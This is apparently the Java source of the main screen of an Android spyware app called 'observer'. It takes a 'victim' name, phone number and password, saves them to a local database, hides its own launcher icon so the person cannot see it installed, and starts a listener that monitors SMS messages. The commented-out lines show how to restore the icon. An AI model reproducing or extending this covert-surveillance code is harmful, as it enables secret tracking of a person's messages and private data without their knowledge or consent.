package com.example.observer;

import android.os.Bundle;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
	public static DatabaseHandler db;
	private static String cache="";
	Button okButton;
	
	
	public static String getCache(){
		return cache;
	}
	public static void setCache(String c){
		cache = c;
	}
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		db = new DatabaseHandler(this);
		okButton = (Button) findViewById(R.id.button1);
		okButton.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				        TextView nameField=(TextView)findViewById(R.id.victim_text);
				        TextView numberField=(TextView)findViewById(R.id.cell_text);
				        TextView passwordField=(TextView)findViewById(R.id.pass_text);
				        
				        String name = nameField.getText().toString();
				        String number = numberField.getText().toString();
				        String password = passwordField.getText().toString();
				        try{
				        	db.addContact(name, number, password);
				        }
				        catch(Exception ex){ex.printStackTrace();}
				        Toast.makeText(getApplicationContext(), "data added successfully...", Toast.LENGTH_LONG).show();
				        
				        // Hide Application Icon 
				        try{
				            PackageManager p = getPackageManager();
				            p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
				        }catch (Exception e) {
				            e.printStackTrace();
				        }
				        
				        // UnHide Application Icon
				       // PackageManager p = getPackageManager();
				       // ComponentName componentName = new ComponentName("com.example.removeicon","com.example.removeicon.LauncherActivity");
				        //p.setComponentEnabledSetting(componentName , PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
				        
				        
			}
		});
		   //Sending sms Reconize 
        sendingDetector sd =new sendingDetector(this);
        sd.listenForSMS();

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
